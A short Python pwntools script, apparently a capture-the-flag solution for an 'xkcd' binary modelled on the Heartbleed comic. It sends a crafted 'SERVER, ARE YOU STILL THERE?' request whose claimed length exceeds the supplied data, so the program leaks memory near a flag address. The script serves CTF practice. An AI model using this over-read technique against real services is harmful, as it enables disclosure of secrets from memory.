'''
Author: Samrito
Date: 2022-02-27 23:44:46
LastEditors: Samrito
LastEditTime: 2022-02-28 00:02:28
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

flag_addr = 0x06B7540
io = process(argv='./xkcd')

payload = flat([
    b'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"', b'0' * 0x200, b'\"@@(530)'
])
io.sendline(payload)
io.interactive()
